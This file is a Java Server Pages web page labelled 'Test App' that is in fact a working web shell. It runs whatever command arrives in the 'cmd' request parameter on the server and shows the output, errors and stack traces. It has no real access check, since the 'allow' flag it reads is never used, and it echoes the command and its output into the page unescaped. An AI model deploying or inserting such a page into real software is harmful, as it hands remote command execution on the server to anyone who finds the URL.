<%@ page language="java" contentType="text/html; charset=ISO-8859-1" import="java.io.*,java.util.*"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<%!
	static final String CMD_PARAM = "cmd";
	/**
	 * Prints the stacktrace of the Exception
	 *
	 * @param Exception e, The Exception instance
	 * @return String, The stacktrace
	 */
	static String printStackTrace(Throwable e)
	{
	    StringWriter sw = new StringWriter();
	    PrintWriter pw = new PrintWriter(sw);
	    e.printStackTrace(pw);
	    return sw.toString();
	}
%>
<%
	String sCmd =  request.getParameter(CMD_PARAM);
	sCmd = (sCmd == null || sCmd.trim().isEmpty()) ? "" : sCmd.trim();
	boolean allowAccess = "entry".equals(request.getParameter("allow"));
%>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Test App</title>
</head>
<body>
<form action="cmd.jsp" method="post">
<pre>
	<label for="cmd">Command: </label>
	<input type="text" name="cmd" id="cmd" value="Enter Cmd Here"/>
	<br/>
	<input type="submit" value="Execute"/>
</pre>
<pre>
	<%if(!sCmd.isEmpty()){ %>
	The command sent was : <%=sCmd%>
	<%
		int retStat = -9999;
		StringBuilder sbErr = new StringBuilder();
		StringBuilder sbOut = new StringBuilder();
		String sExcep = null;
		try{
			Process process = java.lang.Runtime.getRuntime().exec(sCmd);
			retStat = process.waitFor();
			//System.out.printf("Return status: " + retStat);
			 InputStream is = process.getInputStream();
		     InputStreamReader isr = new InputStreamReader(is);
		     BufferedReader br = new BufferedReader(isr);
		     
		     String line;
			// System.out.printf("Output of running [%s] is:\n\n", sCmd);
			 sbOut.append("Output of running [").append(sCmd).append("] is:\n\n");
			 while ((line = br.readLine()) != null) {
		       //System.out.println(line);
		       sbOut.append(line).append('\n');
		     }
			 
			 InputStream es = process.getErrorStream();
		     InputStreamReader esr = new InputStreamReader(es);
		     br = new BufferedReader(esr);
		     
		    // System.out.printf("Error of running [%s] is:\n\n", sCmd);
			 sbErr.append("Error of running [").append(sCmd).append("] is:\n\n");
			 while ((line = br.readLine()) != null) {
		       //System.out.println(line);
		       sbErr.append(line).append('\n');
		     }

		}
		catch(Exception e){
			//e.printStackTrace();
			sExcep = printStackTrace(e);
		}
		if(null == sExcep){
	%>
			Return status : <%=retStat%>
			Command output : <br/><%=sbOut.toString()%>
			Command error : <br/><%=sbErr.toString()%>
	<%} else{ %>
			Exception occured: <br/><%=sExcep%>
		<%} %>
		<input type="hidden" name="entry" id="entry" value="entry"/>
	<%} else{ %>
	<h1> Test Page</h1>
	<%} %>
</pre>
</form>
</body>
</html>